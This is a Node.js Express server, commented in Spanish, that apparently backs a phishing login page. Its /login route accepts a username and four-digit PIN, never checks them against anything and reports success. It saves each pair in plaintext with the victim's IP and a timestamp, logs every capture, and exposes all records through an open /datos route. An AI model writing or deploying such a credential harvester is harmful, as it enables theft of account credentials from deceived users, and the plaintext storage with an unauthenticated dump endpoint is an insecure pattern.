const express = require("express");
const cors = require("cors");
const fs = require("fs");
const path = require("path");

const app = express();
const PORT = 3000;
const DB_FILE = path.join(__dirname, "datos.json");

// Middlewares
app.use(cors());
app.use(express.json());
app.use(express.static(__dirname)); // sirve el HTML estatico

// Inicializar archivo de datos si no existe
if (!fs.existsSync(DB_FILE)) {
    fs.writeFileSync(DB_FILE, JSON.stringify([], null, 2), "utf8");
}

// =====================================================
// POST /login — recibe y guarda las credenciales
// =====================================================
app.post("/login", (req, res) => {
    const { usuario, clave } = req.body;

    // Validacion basica
    if (!usuario || !clave) {
        return res.status(400).json({ success: false, message: "Datos incompletos." });
    }
    if (!/^\d{4}$/.test(clave)) {
        return res.status(400).json({ success: false, message: "La clave debe ser de 4 digitos numericos." });
    }

    // Leer registros actuales
    let registros = [];
    try {
        registros = JSON.parse(fs.readFileSync(DB_FILE, "utf8"));
    } catch (e) {
        registros = [];
    }

    // Agregar nuevo registro con fecha y hora
    const nuevoRegistro = {
        id: registros.length + 1,
        usuario: usuario.trim(),
        clave: clave,
        fecha: new Date().toLocaleString("es-CO", { timeZone: "America/Bogota" }),
        ip: req.headers["x-forwarded-for"] || req.socket.remoteAddress || "desconocida"
    };

    registros.push(nuevoRegistro);

    // Guardar en el archivo JSON
    fs.writeFileSync(DB_FILE, JSON.stringify(registros, null, 2), "utf8");

    console.log(`[+] Datos guardados -> Usuario: ${nuevoRegistro.usuario} | Clave: ${nuevoRegistro.clave} | ${nuevoRegistro.fecha}`);

    // Respuesta al cliente
    res.json({ success: true, message: "Login procesado correctamente." });
});

// =====================================================
// GET /datos — ver todos los registros guardados
// =====================================================
app.get("/datos", (req, res) => {
    try {
        const registros = JSON.parse(fs.readFileSync(DB_FILE, "utf8"));
        res.json(registros);
    } catch (e) {
        res.json([]);
    }
});

app.listen(PORT, () => {
    console.log(`Servidor corriendo en http://localhost:${PORT}`);
    console.log(`Ver datos guardados en: http://localhost:${PORT}/datos`);
});
